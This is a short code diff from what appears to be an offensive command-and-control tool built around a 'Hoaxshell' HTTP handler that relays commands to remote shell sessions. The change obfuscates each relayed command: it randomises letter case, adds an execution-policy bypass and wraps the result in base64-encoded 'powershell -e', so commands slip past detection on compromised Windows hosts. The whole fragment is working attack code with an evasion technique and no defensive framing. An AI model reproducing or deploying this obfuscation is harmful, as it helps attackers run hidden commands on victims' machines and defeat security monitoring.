@@ -748,7 +748,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							Hoaxshell.prompt_ready = False
 							
 							if is_remote_shell:
-								command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
+								command_unobfuscated = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
+								command_unencoded = "-Exec Bypass "+"".join(choice((str.upper, str.lower))(c) for c in command_unobfuscated)
+								command = "powershell -e " + base64.b64encode(command_unencoded.encode('utf16')[2:]).decode()
 								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
 								
 							else:	
